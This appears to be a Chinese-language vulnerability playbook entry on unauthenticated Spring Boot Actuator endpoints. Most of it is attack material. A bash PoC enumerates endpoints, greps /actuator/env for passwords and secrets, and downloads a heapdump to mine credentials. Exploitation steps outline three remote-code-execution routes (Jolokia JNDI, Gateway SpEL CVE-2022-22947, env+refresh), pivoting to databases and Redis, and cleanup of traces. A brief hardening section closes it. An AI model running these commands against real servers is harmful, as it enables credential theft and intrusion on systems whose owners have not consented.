---
title: Spring Boot Actuator 未授权（heapdump / Jolokia / Gateway）
cve: 无（配置缺陷；CVE-2022-22947 为 Gateway 特例）
severity: critical
cvss: 9.0
product: Spring Boot 2.x/3.x
versions: 任意（端点暴露且无鉴权）
ports: 8080, 8443, 9090
keywords: actuator, heapdump, jolokia, env, gateway, spring
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

```
/actuator                → 列出可用端点
/actuator/env  /actuator/heapdump  /actuator/jolokia  /actuator/gateway/routes
老版本: /env  /heapdump  /jolokia  /trace  /dump
```

## 前置条件

- `management.endpoints.web.exposure.include=*` 且无 Spring Security 保护（灰产站一键部署常如此）。

## PoC

```bash
# 1) 端点枚举
for e in env health info beans configprops mappings heapdump threaddump jolokia gateway/routes; do
  code=$(curl -s -o /dev/null -w '%{http_code}' http://target/actuator/$e); echo "$e $code"
done

# 2) 配置泄露（DB/Redis/OSS/JWT secret）
curl -s http://target/actuator/env | grep -Ei 'password|secret|key|url'

# 3) heapdump 拿内存里的凭据
curl -s -o heap.hprof http://target/actuator/heapdump
# 用 jvisualvm / MAT / heapdump_tool 搜 password、token、secret
```

## 利用步骤

1. 端点枚举 → `/env` 里常见的 `spring.datasource.*`、`spring.redis.*`、`oss.accessKey`、`jwt.secret`。
2. `/heapdump` 下载后搜字符串凭据（比 `/env` 更全，含运行时注入的密钥）；`/threaddump` 可看内部服务地址。
3. RCE 三条路：
   - `/actuator/jolokia` → `reloadByURL`（Logback `JNDI`，`CVE-2021-42550` 同族）；
   - `/actuator/gateway/routes` POST SpEL（`CVE-2022-22947`）；
   - `/actuator/env` + `/actuator/refresh` 改 `eureka`/`logback` 配置诱导外连。
4. 拿到 DB 与 Redis 后按 `kb-cloud-container` 与 `kb-triage` 往下走；这类站常一台机器跑"前台+后台+代理"三个应用。
5. 清理：`/actuator/env` 改回的键要恢复；上传的 heapdump 只留 hash 与时间点。

## 修复与缓解（加固）

- `management.endpoints.web.exposure.include=health,info`；管理端点独立端口且只对内网。
- 加 Spring Security 保护 `/actuator/**`；关 `heapdump`/`jolokia`/`gateway`。
- 密钥不进配置文件，走 KMS/环境变量注入并定期轮换。

## 参考

- Spring Boot Actuator 官方文档（端点暴露）；CVE-2022-22947 公告。
